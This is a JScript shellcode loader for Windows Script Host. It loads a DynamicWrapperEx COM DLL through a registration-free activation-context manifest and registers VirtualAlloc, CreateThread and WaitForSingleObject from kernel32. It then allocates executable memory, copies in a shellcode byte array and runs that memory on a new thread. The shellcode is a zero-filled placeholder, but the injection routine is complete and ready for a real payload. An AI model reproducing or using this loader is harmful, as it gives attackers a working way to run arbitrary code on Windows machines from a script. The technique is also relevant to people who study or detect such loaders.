var manifestXML = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"><assemblyIdentity type="win32" name="COM" version="1.0.0.0"/> <file name="DynamicWrapperEx.dll"> <comClass description="DynamicWrapperEx" clsid="{1E2F6CDD-E721-4E94-885C-36C95D6A8CC2}" threadingModel="Both" progid="DynamicWrapperEx"/></file></assembly>'
 
var s = new ActiveXObject('WScript.Shell')
s.Environment('Process')('TMP') = '<path here>';
 
var actCtx = new ActiveXObject("Microsoft.Windows.ActCtx");
actCtx.ManifestText = manifestXML;

//-------------------------------------------------------------------------------------------------
// Method registration
//-------------------------------------------------------------------------------------------------
var dwx = actCtx.CreateObject("DynamicWrapperEx");
try {
    dwx.DwRegister("kernel32.dll", "VirtualAlloc");
    dwx.DwRegister("kernel32.dll", "CreateThread");
    dwx.DwRegister("kernel32.dll", "WaitForSingleObject");
} catch (e) {
    WScript.Echo(e.message)
}

//-------------------------------------------------------------------------------------------------
// MessageBox test
//-------------------------------------------------------------------------------------------------
//dwx.MessageBoxW(null, "Hello from JScript", "else", 4);

//-------------------------------------------------------------------------------------------------
// Shellcode injection
//-------------------------------------------------------------------------------------------------
var commit = 0x00003000; /* MEM_COMMIT | MEM_RESERVE */
var guard = 0x40; /*PAGE_EXECUTE_READWRITE*/

var shellcode = [
    0x00, 0x00, 0x00, 0x00
];
var lpAddress = dwx.VirtualAlloc(0, shellcode.length, commit, guard);
if (lpAddress == 0) {
    WScript.Quit();
}

for (var i = 0; i < shellcode.length; ++i) {
    dwx.WriteByte(shellcode[i], lpAddress, i);
}

var hThread = dwx.CreateThread(null, 0, lpAddress, null, 0, 0);
if (hThread == 0) {
    WScript.Quit();
}
dwx.WaitForSingleObject(hThread, 10000);
